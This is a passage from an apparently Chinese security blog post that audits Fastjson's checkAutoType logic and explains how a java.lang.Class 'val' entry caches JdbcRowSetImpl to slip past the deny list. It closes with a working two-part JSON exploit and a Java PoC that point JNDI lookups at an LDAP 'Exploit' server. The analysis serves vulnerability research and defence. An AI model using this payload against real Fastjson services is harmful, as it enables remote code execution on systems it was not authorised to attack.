&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.从一个Mapping中获取这个类名的类，我们之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//7.从反序列化器中获取这个类名的类，我们也之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//8.如果在6，7中找到了clazz，这里直接return出去，不继续了</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                    &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 9. 针对默认白名单开启情况的处理，这里</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="comment">//碰到黑名单就死</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//满足白名单可以活，但是白名单默认是空的</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//针对expectCLass的特殊处理，没有expectCLass，不管</span></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//通过以上全部检查，就可以从这里读取clazz</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里对一些特殊的class进行处理，不重要</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//特性判断等</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706155729468.png" alt="image-20200706155729468"></p>
<p>仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的<code>return clazz</code>出去才有机会。</p>
<ol>
<li>因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。</li>
<li>白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足<code>TypeUtils.getClassFromMapping(typeName) != null</code>（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。</li>
</ol>
<p>那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。</p>
<p>于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步<code>TypeUtils.getClassFromMapping</code>中得到的恶意类，但是这边都瞅瞅，后面也会用到）</p>
<ol>
<li>TypeUtils.getClassFromMapping(typeName)</li>
<li>deserializers.findClass(typeName)</li>
</ol>
<h2 id="deserializers-findClass-typeName"><a href="#deserializers-findClass-typeName" class="headerlink" title="deserializers.findClass(typeName)"></a>deserializers.findClass(typeName)</h2><p>先看desesrializers，一个hashmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private final IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers         = new IdentityHashMap&lt;Type, ObjectDeserializer&gt;();</span><br></pre></td></tr></table></figure>

<p>因为我们是从中取值，关注一下它是在哪里赋值的,发现是在<code>initDeserializers</code>里面赋值的：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706161123129.png" alt="image-20200706161123129"></p>
<p>initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。</p>
<p>除此之外还有两个函数会影响到desesrializers这个map：</p>
<ol>
<li><strong>getDeserializer</strong></li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</span><br></pre></td></tr></table></figure>

<p>这个函数里面是会往deserializers这个mapping中放入一些特定类：<code>java.awt.*</code>、<code>java.time.*</code>、<code>java.util.Optional*</code>、<code>java.nio.file.Path</code>、<code>Map.Entry.class</code>、以及在服务器<code>META-INF/services/</code>目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用<code>putDesserializer</code>（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706163202276.png" alt="image-20200706163202276"></p>
<p>在这个类中对于类名有着严格的要求和限定，不太行。看下一个。</p>
<ol start="2">
<li><strong>putDeserializer</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#putDeserializer</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> </span>&#123;</span><br><span class="line">        deserializers.put(type, deserializer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码极其简单，但是只在ParserConfig#<code>getDeserializer</code>和<code>initJavaBeanDeserializers</code>类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。</p>
<p>那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。</p>
<p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度。</p>
<p>那换一条路看看<code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
<h2 id="TypeUtils-getClassFromMapping-typeName"><a href="#TypeUtils-getClassFromMapping-typeName" class="headerlink" title="TypeUtils.getClassFromMapping(typeName)"></a>TypeUtils.getClassFromMapping(typeName)</h2><p>先看<code>getClassFromMapping</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个map是一个hashmap</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="comment">//很简单的一个mapping的get</span></span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>按照套路去寻找影响这个mappings的put方法。搜索<code>mappings.put</code>，在下面这两个方法中有找到：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</span><br><span class="line">com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</span><br></pre></td></tr></table></figure>

<p>看<code>addBaseClassMappings</code>这个方法，它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706163801667.png" alt="image-20200706163801667"></p>
<p>前者是一个static静态代码块：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        addBaseClassMappings();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>后者是一个<code>clearClassMapping</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clearClassMapping</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mappings.clear();</span><br><span class="line">    addBaseClassMappings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没戏，不可控。</p>
<p>再看另一个有mappings.put的位置<code>TypeUtils.loadClass</code>，我们需要详细看看这个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">        <span class="comment">//判断className是否为空，是的话直接返回null</span></span><br><span class="line">        <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否已经存在于mappings中</span></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//是的话，直接返回</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否是[开头，1.2.44中针对限制的东西就是这个</span></span><br><span class="line">        <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否L开头;结尾，1.2.42/43中针对限制的就是这里，但都是在外面限制的，里面的东西没变</span></span><br><span class="line">        <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//1. 我们需要关注的mappings在这里有</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//输入的classLoader不为空时</span></span><br><span class="line">            <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//调用加载器去加载我们给的className</span></span><br><span class="line">                clazz = classLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//！！如果cache为true！！</span></span><br><span class="line">                <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                    <span class="comment">//往我们关注的mappings中写入这个className</span></span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;<span class="comment">//返回加载出来的类</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2. 在这里也有，但是好像这里有关线程，比较严格。</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">                clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//同样需要输入的cache为true，才有可能修改</span></span><br><span class="line">                <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3. 这里也有，限制很松</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//加载类</span></span><br><span class="line">            clazz = Class.forName(className);</span><br><span class="line">            <span class="comment">//直接放入mappings中</span></span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）。</p>
<p>看看这个函数在什么地方被引用。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706184302813.png" alt="image-20200706184302813"></p>
<p>在这里面只需要找到符合条件的即可，也就是第三个参数cache=true，发现在1206行，跳转过去看：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706184824853.png" alt="image-20200706184824853"></p>
<p>但跟进去发现这里是在调用自己内部本身，继续依次看，发现一个敏感接口：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334</span><br></pre></td></tr></table></figure>

<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706190449802.png" alt="image-20200706190449802"></p>
<p>跟进去执行分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">        <span class="comment">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object objVal;</span><br><span class="line">        <span class="comment">//3. 下面这段赋值objVal这个值</span></span><br><span class="line">        <span class="comment">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class="line">        <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值为  TypeNameRedirect</span></span><br><span class="line">            parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">            parser.accept(JSONToken.COMMA);</span><br><span class="line">            <span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">             <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">                <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">                <span class="comment">//举例："val":(移动到此处-&gt;)"xxx"</span></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.COLON);</span><br><span class="line">            <span class="comment">//此处获取下一个解析点的值"xxx"赋值到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.RBRACE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">            <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String strVal;</span><br><span class="line">        <span class="comment">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class="line">        <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">            strVal = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            strVal = (String) objVal;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//不必进入的分支</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//省略诸多对于clazz类型判定的不同分支。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == Class<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//我们由这里进来的loadCLass</span></span><br><span class="line">            <span class="comment">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。</span></span><br><span class="line">            <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>那么经过分析，我们可以得到的关注点又跑到<code>parser.resolveStatus</code>这上面来了</p>
<ol>
<li><p>当<code>parser.resolveStatus == TypeNameRedirect</code> 我们需要json串中有一个<strong>“val”:”恶意类名”</strong>，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要<strong>clazz为class类</strong>来满足if判断条件进入loadClass。</p>
<p>所以一个json串的格式大概为<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot;</code> 这样一个东西，大概如此。</p>
</li>
<li><p>当<code>parser.resolveStatus ！= TypeNameRedirect</code>进入if判断的false中，可以直接污染objVal。</p>
<p>再加上<strong>clazz=class类</strong>，大概需要一个json串如下:<code>&quot;被屏蔽的type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;</code>。</p>
</li>
</ol>
<p>至于哪里调用了<code>MiscCodec.java#deserialze</code>，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行</code></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706193256474.png" alt="image-20200706193256474"></p>
<h2 id="定向构造payload"><a href="#定向构造payload" class="headerlink" title="定向构造payload"></a>定向构造payload</h2><p>那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">    <span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先是日常进入解析主要函数<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
<p>这里有我们的三个在乎的点，如下顺序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">//先是checkAutoType这个万恶的过滤函数</span></span><br><span class="line">   clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">//ResolveStatus的赋值</span></span><br><span class="line">   <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line">   <span class="comment">//污染TypeUtils.getClassFromMapping的触发处</span></span><br><span class="line">   Object obj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>这个分析过了。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706195524423.png" alt="image-20200706195524423"></p>
<p>step out之后继续跟进，可以看到，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706200040175.png" alt="image-20200706200040175"></p>
<p>继续跟，就到了第三个关注点deserialize函数：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706200201139.png" alt="image-20200706200201139"></p>
<p>果断跟进去！</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201609999.png" alt="image-20200706201609999"></p>
<p>继续跟，恶意类被解析赋值！</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201735423.png" alt="image-20200706201735423"></p>
<p>跳过后续的一堆if判断，来到符合条件的clazz对象，跟进去：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201836682.png" alt="image-20200706201836682"></p>
<p>默认的cache为true，接下来就会进入三个mapping.put条件，跟下去，看看哪个能触发：</p>
<p>第一个，发现classloader是null，被skip掉了。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202152124.png" alt="image-20200706202152124"></p>
<p>来到第二个，跟进去，发现被加入到map中了，sum+1：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202451082.png" alt="image-20200706202451082"></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094438-6facdc2e-2d01-1.jpg" alt="img"></p>
<p>第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了<code>mappings.put</code>放入了我们的恶意类名！</p>
<p>完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。</p>
<p>老习惯，附上调用栈：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094438-6fc52b08-2d01-1.jpg" alt="img"></p>
<h2 id="定稿payload"><a href="#定稿payload" class="headerlink" title="定稿payload"></a>定稿payload</h2><p>之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。</p>
<p>但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了下面这个：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload  = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span></span><br><span class="line">                + <span class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span></span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202953984.png" alt="image-20200706202953984"></p>
<p>本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。</p>
<p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p>
<p>回顾一下审计的过程：</p>
<p>我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</p>
<ol>
<li>checkAutoType方法拿到Class.class</li>
<li>设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向</li>
<li>进入deserializer.deserialze</li>
</ol>
<p>com.alibaba.fastjson.serializer.MiscCodec#deserialze</p>
<ol>
<li>parser.resolveStatus为TypeNameRedirect，进入if为true走向</li>
<li>解析”val”:”恶意类名”，放入objVal，再传递到strVal</li>
<li>因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal</li>
</ol>
<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p>
<ol>
<li>添加默认cache为true，调用loadClass</li>
</ol>
<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</p>
<ol>
<li>三个改变mappings的第一处，由于classLoader=null，不进入</li>
<li>三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。</li>
</ol>
